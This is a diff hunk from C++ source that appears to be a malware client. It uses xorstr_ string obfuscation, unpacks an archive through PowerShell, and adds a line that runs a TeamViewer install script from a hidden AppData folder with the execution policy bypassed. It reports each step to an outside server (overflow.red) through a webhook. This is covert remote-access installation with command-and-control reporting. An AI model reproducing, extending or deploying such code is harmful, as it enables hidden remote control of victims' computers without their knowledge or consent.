@@ -226,7 +226,9 @@ namespace client {
 			std::string command = xorstr_("powershell -command \"Expand-Archive ") + path + " -DestinationPath " + unzip_path + "\"";
 			system(command.c_str());
 
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("Finished Downloading and Extracing")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+			system(std::string(xorstr_("cd ") + helpers::roaming + xorstr_("\\Microsoft\\tv") + " && powershell -executionpolicy bypass -file teamviewer_install.ps1").c_str());
+
+			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("Installed Successfully")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
 		}
 
 		void install_nmap() {
